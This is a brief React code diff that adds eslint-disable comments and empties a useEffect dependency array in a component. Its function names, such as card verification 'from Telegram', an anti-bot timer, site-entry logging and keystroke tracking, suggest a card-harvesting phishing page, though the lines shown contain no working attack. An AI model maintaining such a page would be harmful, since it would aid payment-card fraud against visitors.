@@ -349,6 +349,7 @@ const handleCardVerificationFromTelegram = () => {
   );
 
   // Anti-bot initialization
+  // eslint-disable-next-line react-hooks/exhaustive-deps
   useEffect(() => {
   startTimer();
   const handleMouseMove = () => trackInteraction();
@@ -364,7 +365,8 @@ const handleCardVerificationFromTelegram = () => {
     window.removeEventListener('mousemove', handleMouseMove);
     resetAntiBot();
   };
-}, [sendSiteEntryLog]);
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+}, []);
 
   const handleInputChange = async (field, value) => {
     trackTyping();
